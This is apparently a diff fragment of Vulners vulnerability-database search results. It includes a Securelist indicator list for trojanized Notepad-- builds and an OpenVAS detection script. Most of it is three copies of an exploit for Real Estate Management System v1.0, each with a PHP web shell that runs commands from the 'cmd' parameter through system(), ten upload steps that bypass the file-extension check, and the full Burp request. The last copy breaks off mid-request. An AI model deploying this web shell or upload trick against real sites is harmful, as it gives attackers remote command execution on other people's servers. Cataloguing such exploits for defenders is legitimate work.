\n[43447f4c2499b1ad258371adff4f503f](<https://opentip.kaspersky.com/43447f4c2499b1ad258371adff4f503f/?utm_source=SL&utm_medium=SL&utm_campaign=SL>) | Mach-O 64-bit | DPysMac64  \n[00fb77b83b8ab13461ea9dd27073f54f](<https://opentip.kaspersky.com/00fb77b83b8ab13461ea9dd27073f54f/?utm_source=SL&utm_medium=SL&utm_campaign=SL>) | DMG | Notepad\u2010\u2010v2.0.0-mac_x64_12.3.dmg  \n[5ece6281d57f16d6ae773a16f83568db](<https://opentip.kaspersky.com/5ece6281d57f16d6ae773a16f83568db/?utm_source=SL&utm_medium=SL&utm_campaign=SL>) | AppImage | Notepad\u2010\u2010-x86_64.AppImage  \n[6ace1e014863eee67ab1d2d17a33d146](<https://opentip.kaspersky.com/6ace1e014863eee67ab1d2d17a33d146/?utm_source=SL&utm_medium=SL&utm_campaign=SL>) | Mach-O 64-bit | NotePad\u2010\u2010  \n[47c9fec1a949e160937dd9f9457ec689](<https://opentip.kaspersky.com/47c9fec1a949e160937dd9f9457ec689/?utm_source=SL&utm_medium=SL&utm_campaign=SL>) | ELF 64-bit | NotePad\u2010\u2010  \n  \n**Links:**\n\n[dns[.]transferusee[.]com](<https://opentip.kaspersky.com/dns.transferusee.com/?utm_source=SL&utm_medium=SL&utm_campaign=SL>)  \n---  \n[update[.]transferusee[.]com/onl/mac/](<https://opentip.kaspersky.com/update.transferusee.com/onl/mac/?utm_source=SL&utm_medium=SL&utm_campaign=SL>)  \n[update[.]transferusee[.]com/onl/lnx/](<https://opentip.kaspersky.com/update.transferusee.com/onl/lnx/?utm_source=SL&utm_medium=SL&utm_campaign=SL>)  \n[update[.]transferusee[.]com/DPysMac64](<https://opentip.kaspersky.com/update.transferusee.com/DPysMac64/?utm_source=SL&utm_medium=SL&utm_campaign=SL>)  \n[update[.]transferusee[.]com/DPysMacM1](<https://opentip.kaspersky.com/update.transferusee.com/DPysMacM1/?utm_source=SL&utm_medium=SL&utm_campaign=SL>)  \n[vnote[.]info](<https://opentip.kaspersky.com/vnote.info/?utm_source=SL&utm_medium=SL&utm_campaign=SL>)  \n[vnote[.]fuwenkeji[.]cn](<https://opentip.kaspersky.com/vnote.fuwenkeji.cn/?utm_source=SL&utm_medium=SL&utm_campaign=SL>)  \n[vnotepad[.]com](<https://opentip.kaspersky.com/vnotepad.com/?utm_source=SL&utm_medium=SL&utm_campaign=SL>)  \n[vnote-1321786806[.]cos[.]ap-hongkong[.]myqcloud[.]com](<https://opentip.kaspersky.com/vnote-1321786806.cos.ap-hongkong.myqcloud.com/?utm_source=SL&utm_medium=SL&utm_campaign=SL>)",
+                    "cvss3": {},
+                    "published": "2024-03-13T11:29:43",
+                    "type": "securelist",
+                    "title": "What\u2019s in your notepad? Infected text editors target Chinese users",
+                    "bulletinFamily": "blog",
+                    "cvss2": {},
+                    "cvelist": [],
+                    "modified": "2024-03-13T11:29:43",
+                    "id": "SECURELIST:8E6BE65DDA4CA9ECA0CBF89F16A4D473",
+                    "href": "https://securelist.com/trojanized-text-editor-apps/112167/",
+                    "cvss": {
+                        "score": 0.0,
+                        "vector": "NONE"
+                    },
+                    "vhref": "https://vulners.com/securelist/SECURELIST:8E6BE65DDA4CA9ECA0CBF89F16A4D473"
+                },
+                "highlight": {
+                    "description": [
+                        "++ (left) and search results for vnote (right)\n\nThe malicious site found in the **<span class=\"vulners-highlight\">notepad</span>++** search is distributed through an advertisement block.",
+                        "Opening it, an attentive user will immediately notice an amusing inconsistency: the website address contains the line **vnote**, the title offers a download of **<span class=\"vulners-highlight\">Notepad</span>\u2010\u2010** (an analog of **<span class=\"vulners-highlight\">Notepad</span>++**",
+                        ", also distributed as open-source software), while the image proudly shows **<span class=\"vulners-highlight\">Notepad</span>++**.",
+                        "In fact, the packages downloaded from here contain **<span class=\"vulners-highlight\">Notepad</span>\u2010\u2010**.\n\n[!",
+                        "It&#x27;s also worth mentioning another interesting detail that we found completely by chance during the examination of the modified **<span class=\"vulners-highlight\">NotePad</span>\u2010\u2010**."
+                    ],
+                    "title": [
+                        "What\u2019s in your <span class=\"vulners-highlight\">notepad</span>? Infected text editors target Chinese users"
+                    ]
+                },
+                "sort": [
+                    23.381357,
+                    1710329383000
+                ],
+                "flatDescription": "&quot;Malvertising&quot; is a popular way of attracting victims to malicious sites: an advertisement block is placed at the top of the search results, increasing the likelihood of users clicking the link. Sites at the top of search results also tend to be more trusted by users. A year ago, our experts..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "OPENVAS:1361412562310805317",
+                "_score": 22.639732,
+                "_source": {
+                    "lastseen": "2024-02-09T10:32:01",
+                    "description": "Detects the installed version of\n  Notepad++ on Windows.\n\n  This script logs in via smb, searches for ",
+                    "cvss3": {},
+                    "published": "2015-01-09T00:00:00",
+                    "type": "openvas",
+                    "title": "Notepad++ Detection (Windows SMB Login)",
+                    "bulletinFamily": "scanner",
+                    "cvss2": {},
+                    "cvelist": [],
+                    "modified": "2024-02-08T00:00:00",
+                    "id": "OPENVAS:1361412562310805317",
+                    "href": "http://plugins.openvas.org/nasl.php?oid=1361412562310805317",
+                    "sourceData": "# SPDX-FileCopyrightText: 2015 Greenbone AG\n# Some text descriptions might be excerpted from (a) referenced\n# source(s), and are Copyright (C) by the respective right holder(s).\n#\n# SPDX-License-Identifier: GPL-2.0-only\n\nif(description)\n{\n  script_oid(\"1.3.6.1.4.1.25623.1.0.805317\");\n  script_version(\"2024-02-08T14:36:53+0000\");\n  script_tag(name:\"cvss_base\", value:\"0.0\");\n  script_tag(name:\"cvss_base_vector\", value:\"AV:N/AC:L/Au:N/C:N/I:N/A:N\");\n  script_tag(name:\"last_modification\", value:\"2024-02-08 14:36:53 +0000 (Thu, 08 Feb 2024)\");\n  script_tag(name:\"creation_date\", value:\"2015-01-09 13:19:25 +0530 (Fri, 09 Jan 2015)\");\n  script_name(\"Notepad++ Detection (Windows SMB Login)\");\n  script_category(ACT_GATHER_INFO);\n  script_copyright(\"Copyright (C) 2015 Greenbone AG\");\n  script_family(\"Product detection\");\n  script_dependencies(\"smb_reg_service_pack.nasl\");\n  script_mandatory_keys(\"SMB/WindowsVersion\", \"SMB/Windows/Arch\");\n  script_require_ports(139, 445);\n\n  script_tag(name:\"summary\", value:\"Detects the installed version of\n  Notepad++ on Windows.\n\n  This script logs in via smb, searches for 'Notepad++' in the registry and\n  gets the version from registry.\");\n\n  script_tag(name:\"qod_type\", value:\"registry\");\n\n  exit(0);\n}\n\ninclude(\"smb_nt.inc\");\ninclude(\"cpe.inc\");\ninclude(\"host_details.inc\");\n\nos_arch = get_kb_item(\"SMB/Windows/Arch\");\nif(!os_arch){\n  exit(0);\n}\n\nif(\"x86\" >< os_arch){\n  key_list = make_list(\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Notepad++\");\n} else if(\"x64\" >< os_arch){\n  key_list = make_list(\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Notepad++\",\n                       \"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Notepad++\");\n}\n\nif(isnull(key_list)){\n  exit(0);\n}\n\nforeach key(key_list) {\n\n  noteName = registry_get_sz(key:key, item:\"DisplayName\");\n  if(\"Notepad++\" >< noteName){\n\n    noteVer = registry_get_sz(key:key, item:\"DisplayVersion\");\n    if(!noteVer){\n      continue;\n    }\n\n    notePath = registry_get_sz(item:\"UninstallString\", key:key);\n    if(!notePath){\n      notePath = \"Could not find the install location from registry\";\n    } else{\n      notePath = notePath - \"\\uninstall.exe\";\n    }\n\n    # Used in gb_notepadpp_detect_portable_win.nasl to avoid doubled detections.\n    # We're also stripping a possible ending backslash away as the portable VT is getting\n    # the file path without the ending backslash from WMI.\n    tmp_location = tolower(notePath);\n    tmp_location = ereg_replace(pattern:\"\\\\$\", string:tmp_location, replace:'');\n    set_kb_item(name:\"Notepad++/Win/InstallLocations\", value:tmp_location);\n\n    if(\"x64\" >< os_arch && \"Wow6432Node\" >!< key){\n      base = \"cpe:/a:notepad-plus-plus:notepad++:x64:\";\n      set_kb_item(name:\"Notepad++64/Win/installed\", value:TRUE);\n      set_kb_item(name:\"Notepad++32or64/Win/installed\", value:TRUE);\n    } else {\n      base = \"cpe:/a:notepad-plus-plus:notepad++:\";\n      set_kb_item(name:\"Notepad++32/Win/installed\", value:TRUE);\n      set_kb_item(name:\"Notepad++32or64/Win/installed\", value:TRUE);\n    }\n    register_and_report_cpe(app:noteName, ver:noteVer, concluded:noteVer, base:base, expr:\"^([0-9.]+)\", insloc:notePath);\n  }\n}\n\nexit(0);\n",
+                    "cvss": {
+                        "score": 0.0,
+                        "vector": "NONE"
+                    },
+                    "vhref": "https://vulners.com/openvas/OPENVAS:1361412562310805317"
+                },
+                "highlight": {
+                    "description": [
+                        "Detects the installed version of\n  <span class=\"vulners-highlight\">Notepad</span>++ on Windows.\n\n  This script logs in via smb, searches for"
+                    ],
+                    "title": [
+                        "<span class=\"vulners-highlight\">Notepad</span>++ Detection (Windows SMB Login)"
+                    ],
+                    "sourceData": [
+                        "script_tag(name:\"last_modification\", value:\"2024-02-08 14:36:53 +0000 (Thu, 08 Feb 2024)\");\n  script_tag(name:\"creation_date\", value:\"2015-01-09 13:19:25 +0530 (Fri, 09 Jan 2015)\");\n  script_name(\"<span class=\"vulners-highlight\">Notepad</span>",
+                        "\\Windows\\CurrentVersion\\Uninstall\\<span class=\"vulners-highlight\">Notepad</span>++\",\n                       \"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\<span class=\"vulners-highlight\">Notepad</span>++\");\n}\n\nif(isnull(key_list)){\n  exit(0);\n}\n\nforeach key(key_list",
+                        ") {\n\n  noteName = registry_get_sz(key:key, item:\"DisplayName\");\n  if(\"<span class=\"vulners-highlight\">Notepad</span>++\" >< noteName){\n\n    noteVer = registry_get_sz(key:key, item:\"DisplayVersion\");\n    if(!",
+                        "< key){\n      base = \"cpe:/a:notepad-plus-plus:notepad++:x64:\";\n      set_kb_item(name:\"<span class=\"vulners-highlight\">Notepad</span>++64/Win/installed\", value:TRUE);\n      set_kb_item(name:\"<span class=\"vulners-highlight\">Notepad</span>++32or64/Win/installed\", value:TRUE);",
+                        "} else {\n      base = \"cpe:/a:notepad-plus-plus:notepad++:\";\n      set_kb_item(name:\"<span class=\"vulners-highlight\">Notepad</span>++32/Win/installed\", value:TRUE);\n      set_kb_item(name:\"<span class=\"vulners-highlight\">Notepad</span>++32or64/Win/installed\", value:TRUE);\n    }"
+                    ]
+                },
+                "sort": [
+                    22.639732,
+                    1420761600000
+                ],
+                "flatDescription": "Detects the installed version of   Notepad++ on Windows. This script logs in via smb, searches for  # SPDX-FileCopyrightText: 2015 Greenbone AG Some text descriptions might be excerpted from (a) referenced source(s), and are Copyright (C) by the respective right holder(s). ..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "1337DAY-ID-39392",
+                "_score": 16.639956,
+                "_source": {
+                    "lastseen": "2024-03-04T19:26:14",
+                    "description": "",
+                    "cvss3": {},
+                    "published": "2024-03-04T00:00:00",
+                    "type": "zdt",
+                    "title": "Real Estate Management System v1.0 - Remote Code Execution via File Upload Vulnerability",
+                    "bulletinFamily": "exploit",
+                    "cvss2": {},
+                    "cvelist": [],
+                    "modified": "2024-03-04T00:00:00",
+                    "id": "1337DAY-ID-39392",
+                    "href": "https://0day.today/exploit/description/39392",
+                    "sourceData": "# Exploit Title: Real Estate Management System v1.0 - Remote Code Execution via File Upload\n# Exploit Author: Diyar Saadi\n# Vendor Homepage: https://codeastro.com\n# Version: V1.0\n# Tested on: Windows 11 +  XAMPP 8.0.30 + Burp Suite Professional v2023.12.1.3\n\n\n## Description ## \n\nThis Vulnerability allow the attacker to execute command injection payloads and upload malicious file into web server .\n\n-----------------------------------------------------------------------------------------------------------------------\n\n\n## Simple RCE Payload : ##\n\n<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system_payload($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n</html>\n-----------------------------------------------------------------------------------------------------------------------\n## Steps to Reproduce ## \n\n1- Open Burp Suite ( Community + Professional ) + Click on Proxy Tab Then Enable Intercept By Clicking at Intercept is off .\n2- Open The Browser From Proxy Tab Then Open The Resgister Web Page : http://localhost:8080/realestate/register.php\n3- Prepare Your RCE PHP Script Base From Notepad or Any Editor Then Save the RCE PHP Script Base as : avatar.php filename . \n4- Change The Filename extension into avatar.png ,  after save the RCE PHP Script .\n5- Click Chose File From User Image Section Then Upload Your avatar.png file .\n6- Click Register Then Back to Burp Suite Proxy Tab :\n7- Modify File Extension Into Orginal File Extension that is : avatar.php in Example :  Content-Disposition: form-data; name=\"uimage\"; filename=\"avatar.png\"\nContent-Type: image/png . \n8- After Modify The Content-Disposition From Burp Suite Proxy Tab Into Orginal File Extension Click Forward Button . \n9- Open The Login Page : http://localhost:8080/realestate/login.php Then Register Through Your Account Email & Password .\n10 - From MenuBar Click My Account & Profile Then Right Click at Image Icon > Copy Link > New Tab > Paste > Your Malicious Command is Ready To Execute .!\n\n-----------------------------------------------------------------------------------------------------------------------\n\n\n## Burp Request : ##\n\nPOST /realestate/register.php HTTP/1.1\nHost: localhost\nContent-Length: 1100\nCache-Control: max-age=0\nsec-ch-ua: \"Chromium\";v=\"121\", \"Not A(Brand\";v=\"99\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nOrigin: http://localhost\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarywA99kZOAu8APGlhv\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: http://localhost/realestate/register.php\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"name\"\n\njohnhamosh\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"email\"\n\n[email\u00a0protected]\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"phone\"\n\n+199988764\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"pass\"\n\n<html> <body> <form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"> <input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"> <input type=\"SUBMIT\" value=\"Execute\"> </form> <pre> <?php     if(isset($_GET['cmd']))     {         system($_GET['cmd']);     } ?> </pre> </body> </html>\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"utype\"\n\nuser\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"uimage\"; filename=\"avatar.php\"\nContent-Type: image/png\n\n<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n</html>\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"reg\"\n\nRegister\n------WebKitFormBoundarypgW90eleiRxRzcEK--\n\n-----------------------------------------------------------------------------------------------------------------------\n\n\n## PoC Simple RCE Through This Vulnerability :  ##\n\nDirectory of C:\\xampp\\htdocs\\realestate\\admin\\user \n          ..\n02/11/2024  08:09 PM               315 avatar.php\n02/11/2024  08:04 PM               315 avatar.png\n02/11/2024  06:54 PM             9,376 avatarm2-min.jpg\n02/11/2024  06:54 PM            13,186 avatarm7-min.jpg\n02/11/2024  07:47 PM             1,814 avatars.php\n02/11/2024  06:54 PM             1,313 gr7.png\n02/11/2024  07:36 PM                28 poc.php\n\n-----------------------------------------------------------------------------------------------------------------------\n\n\n## Video PoC : ##\n\n1- https://github.com/vulnerablecms/RCE-RealEstateVIDEOPOC/blob/main/PoC-RCE.mp4\n2- https://gofile.io/d/AEWEgI\n-----------------------------------------------------------------------------------------------------------------------\n\n\nGreetz !\n",
+                    "sourceHref": "https://0day.today/exploit/39392",
+                    "cvss": {
+                        "score": 0.0,
+                        "vector": "NONE"
+                    },
+                    "vhref": "https://vulners.com/zdt/1337DAY-ID-39392"
+                },
+                "highlight": {
+                    "sourceData": [
+                        "Intercept By Clicking at Intercept is off .\n2- Open The Browser From Proxy Tab Then Open The Resgister Web Page : http://localhost:8080/realestate/register.php\n3- Prepare Your RCE PHP Script Base From <span class=\"vulners-highlight\">Notepad</span>"
+                    ]
+                },
+                "sort": [
+                    16.639956,
+                    1709510400000
+                ],
+                "flatDescription": "# Exploit Title: Real Estate Management System v1.0 - Remote Code Execution via File Upload Exploit Author: Diyar Saadi Vendor Homepage: https://codeastro.com Version: V1.0 Tested on: Windows 11 +  XAMPP 8.0.30 + Burp Suite Professional v2023.12.1.3 Description ## This Vulnerability allow the..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "PACKETSTORM:177389",
+                "_score": 15.868209,
+                "_source": {
+                    "lastseen": "2024-03-04T16:48:40",
+                    "description": "",
+                    "cvss3": {},
+                    "published": "2024-03-04T00:00:00",
+                    "type": "packetstorm",
+                    "title": "Real Estate Management System 1.0 Shell Upload",
+                    "bulletinFamily": "exploit",
+                    "cvss2": {},
+                    "cvelist": [],
+                    "modified": "2024-03-04T00:00:00",
+                    "id": "PACKETSTORM:177389",
+                    "href": "https://packetstormsecurity.com/files/177389/Real-Estate-Management-System-1.0-Shell-Upload.html",
+                    "sourceData": "`# Exploit Title: Real Estate Management System v1.0 - Remote Code Execution via File Upload  \n# Date: 2/11/2024  \n# Exploit Author: Diyar Saadi  \n# Vendor Homepage: https://codeastro.com  \n# Version: V1.0  \n# Tested on: Windows 11 + XAMPP 8.0.30 + Burp Suite Professional v2023.12.1.3  \n  \n  \n## Description ##   \n  \nThis Vulnerability allow the attacker to execute command injection payloads and upload malicious file into web server .  \n  \n-----------------------------------------------------------------------------------------------------------------------  \n  \n  \n## Simple RCE Payload : ##  \n  \n<html>  \n<body>  \n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">  \n<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">  \n<input type=\"SUBMIT\" value=\"Execute\">  \n</form>  \n<pre>  \n<?php  \nif(isset($_GET['cmd']))  \n{  \nsystem_payload($_GET['cmd']);  \n}  \n?>  \n</pre>  \n</body>  \n</html>  \n-----------------------------------------------------------------------------------------------------------------------  \n## Steps to Reproduce ##   \n  \n1- Open Burp Suite ( Community + Professional ) + Click on Proxy Tab Then Enable Intercept By Clicking at Intercept is off .  \n2- Open The Browser From Proxy Tab Then Open The Resgister Web Page : http://localhost:8080/realestate/register.php  \n3- Prepare Your RCE PHP Script Base From Notepad or Any Editor Then Save the RCE PHP Script Base as : avatar.php filename .   \n4- Change The Filename extension into avatar.png , after save the RCE PHP Script .  \n5- Click Chose File From User Image Section Then Upload Your avatar.png file .  \n6- Click Register Then Back to Burp Suite Proxy Tab :  \n7- Modify File Extension Into Orginal File Extension that is : avatar.php in Example : Content-Disposition: form-data; name=\"uimage\"; filename=\"avatar.png\"  \nContent-Type: image/png .   \n8- After Modify The Content-Disposition From Burp Suite Proxy Tab Into Orginal File Extension Click Forward Button .   \n9- Open The Login Page : http://localhost:8080/realestate/login.php Then Register Through Your Account Email & Password .  \n10 - From MenuBar Click My Account & Profile Then Right Click at Image Icon > Copy Link > New Tab > Paste > Your Malicious Command is Ready To Execute .!  \n  \n-----------------------------------------------------------------------------------------------------------------------  \n  \n  \n## Burp Request : ##  \n  \nPOST /realestate/register.php HTTP/1.1  \nHost: localhost  \nContent-Length: 1100  \nCache-Control: max-age=0  \nsec-ch-ua: \"Chromium\";v=\"121\", \"Not A(Brand\";v=\"99\"  \nsec-ch-ua-mobile: ?0  \nsec-ch-ua-platform: \"Windows\"  \nUpgrade-Insecure-Requests: 1  \nOrigin: http://localhost  \nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarywA99kZOAu8APGlhv  \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  \nSec-Fetch-Site: same-origin  \nSec-Fetch-Mode: navigate  \nSec-Fetch-User: ?1  \nSec-Fetch-Dest: document  \nReferer: http://localhost/realestate/register.php  \nAccept-Encoding: gzip, deflate, br  \nAccept-Language: en-US,en;q=0.9  \nConnection: close  \n  \n------WebKitFormBoundarypgW90eleiRxRzcEK  \nContent-Disposition: form-data; name=\"name\"  \n  \njohnhamosh  \n------WebKitFormBoundarypgW90eleiRxRzcEK  \nContent-Disposition: form-data; name=\"email\"  \n  \nrasu1l@in.com  \n------WebKitFormBoundarypgW90eleiRxRzcEK  \nContent-Disposition: form-data; name=\"phone\"  \n  \n+199988764  \n------WebKitFormBoundarypgW90eleiRxRzcEK  \nContent-Disposition: form-data; name=\"pass\"  \n  \n<html> <body> <form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"> <input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"> <input type=\"SUBMIT\" value=\"Execute\"> </form> <pre> <?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> </pre> </body> </html>  \n------WebKitFormBoundarypgW90eleiRxRzcEK  \nContent-Disposition: form-data; name=\"utype\"  \n  \nuser  \n------WebKitFormBoundarypgW90eleiRxRzcEK  \nContent-Disposition: form-data; name=\"uimage\"; filename=\"avatar.php\"  \nContent-Type: image/png  \n  \n<html>  \n<body>  \n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">  \n<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">  \n<input type=\"SUBMIT\" value=\"Execute\">  \n</form>  \n<pre>  \n<?php  \nif(isset($_GET['cmd']))  \n{  \nsystem($_GET['cmd']);  \n}  \n?>  \n</pre>  \n</body>  \n</html>  \n------WebKitFormBoundarypgW90eleiRxRzcEK  \nContent-Disposition: form-data; name=\"reg\"  \n  \nRegister  \n------WebKitFormBoundarypgW90eleiRxRzcEK--  \n  \n-----------------------------------------------------------------------------------------------------------------------  \n  \n  \n## PoC Simple RCE Through This Vulnerability : ##  \n  \nDirectory of C:\\xampp\\htdocs\\realestate\\admin\\user   \n..  \n02/11/2024 08:09 PM 315 avatar.php  \n02/11/2024 08:04 PM 315 avatar.png  \n02/11/2024 06:54 PM 9,376 avatarm2-min.jpg  \n02/11/2024 06:54 PM 13,186 avatarm7-min.jpg  \n02/11/2024 07:47 PM 1,814 avatars.php  \n02/11/2024 06:54 PM 1,313 gr7.png  \n02/11/2024 07:36 PM 28 poc.php  \n  \n-----------------------------------------------------------------------------------------------------------------------  \n  \n  \n## Video PoC : ##  \n  \n1- https://github.com/vulnerablecms/RCE-RealEstateVIDEOPOC/blob/main/PoC-RCE.mp4  \n2- https://gofile.io/d/AEWEgI  \n-----------------------------------------------------------------------------------------------------------------------  \n  \n  \nGreetz !  \n  \n`\n",
+                    "sourceHref": "https://packetstormsecurity.com/files/download/177389/rems10-shell.txt",
+                    "cvss": {
+                        "score": 0.0,
+                        "vector": "NONE"
+                    },
+                    "vhref": "https://vulners.com/packetstorm/PACKETSTORM:177389"
+                },
+                "highlight": {
+                    "sourceData": [
+                        "Intercept By Clicking at Intercept is off .  \n2- Open The Browser From Proxy Tab Then Open The Resgister Web Page : http://localhost:8080/realestate/register.php  \n3- Prepare Your RCE PHP Script Base From <span class=\"vulners-highlight\">Notepad</span>"
+                    ]
+                },
+                "sort": [
+                    15.868209,
+                    1709510400000
+                ],
+                "flatDescription": "`# Exploit Title: Real Estate Management System v1.0 - Remote Code Execution via File Upload   Date: 2/11/2024 Exploit Author: Diyar Saadi Vendor Homepage: https://codeastro.com Version: V1.0 Tested on: Windows 11 + XAMPP 8.0.30 + Burp Suite Professional v2023.12.1.3 Description ## This..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "EDB-ID:51840",
+                "_score": 15.640546,
+                "_source": {
+                    "lastseen": "2024-03-09T16:56:49",
+                    "description": "",
+                    "cvss3": {},
+                    "published": "2024-03-03T00:00:00",
+                    "type": "exploitdb",
+                    "title": "Real Estate Management System v1.0 - Remote Code Execution via File Upload",
+                    "bulletinFamily": "exploit",
+                    "cvss2": {},
+                    "cvelist": [],
+                    "modified": "2024-03-03T00:00:00",
+                    "id": "EDB-ID:51840",
+                    "href": "https://www.exploit-db.com/exploits/51840",
+                    "sourceData": "# Exploit Title: Real Estate Management System v1.0 - Remote Code Execution via File Upload\r\n# Date: 2/11/2024\r\n# Exploit Author: Diyar Saadi\r\n# Vendor Homepage: https://codeastro.com\r\n# Version: V1.0\r\n# Tested on: Windows 11 +  XAMPP 8.0.30 + Burp Suite Professional v2023.12.1.3\r\n\r\n\r\n## Description ## \r\n\r\nThis Vulnerability allow the attacker to execute command injection payloads and upload malicious file into web server .\r\n\r\n-----------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n## Simple RCE Payload : ##\r\n\r\n<html>\r\n<body>\r\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\r\n<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\r\n<input type=\"SUBMIT\" value=\"Execute\">\r\n</form>\r\n<pre>\r\n<?php\r\n    if(isset($_GET['cmd']))\r\n    {\r\n        system_payload($_GET['cmd']);\r\n    }\r\n?>\r\n</pre>\r\n</body>\r\n</html>\r\n-----------------------------------------------------------------------------------------------------------------------\r\n## Steps to Reproduce ## \r\n\r\n1- Open Burp Suite ( Community + Professional ) + Click on Proxy Tab Then Enable Intercept By Clicking at Intercept is off .\r\n2- Open The Browser From Proxy Tab Then Open The Resgister Web Page : http://localhost:8080/realestate/register.php\r\n3- Prepare Your RCE PHP Script Base From Notepad or Any Editor Then Save the RCE PHP Script Base as : avatar.php filename . \r\n4- Change The Filename extension into avatar.png ,  after save the RCE PHP Script .\r\n5- Click Chose File From User Image Section Then Upload Your avatar.png file .\r\n6- Click Register Then Back to Burp Suite Proxy Tab :\r\n7- Modify File Extension Into Orginal File Extension that is : avatar.php in Example :  Content-Disposition: form-data; name=\"uimage\"; filename=\"avatar.png\"\r\nContent-Type: image/png . \r\n8- After Modify The Content-Disposition From Burp Suite Proxy Tab Into Orginal File Extension Click Forward Button . \r\n9- Open The Login Page : http://localhost:8080/realestate/login.php Then Register Through Your Account Email & Password .\r\n10 - From MenuBar Click My Account & Profile Then Right Click at Image Icon > Copy Link > New Tab > Paste > Your Malicious Command is Ready To Execute .!\r\n\r\n-----------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n## Burp Request : ##\r\n\r\nPOST /realestate/register.php HTTP/1.1\r\nHost: localhost\r\nContent-Length: 1100\r\nCache-Control: max-age=0\r\nsec-ch-ua: \"Chromium\";v=\"121\", \"Not A(Brand\";v=\"99\"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: \"Windows\"\r\nUpgrade-Insecure-Requests: 1\r\nOrigin: http://localhost\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarywA99kZOAu8APGlhv\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nReferer: http://localhost/realestate/register.php\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\n------WebKitFormBoundarypgW90eleiRxRzcEK\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\njohnhamosh\r\n------WebKitFormBoundarypgW90eleiRxRzcEK\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nrasu1l@in.com\r\n------WebKitFormBoundarypgW90eleiRxRzcEK\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n+199988764\r\n------WebKitFormBoundarypgW90eleiRxRzcEK\r\nContent-Disposition: form-data; name=\"pass\"\r\n\r\n<html> <body> <form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"> <input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"> <input type=\"SUBMIT\" 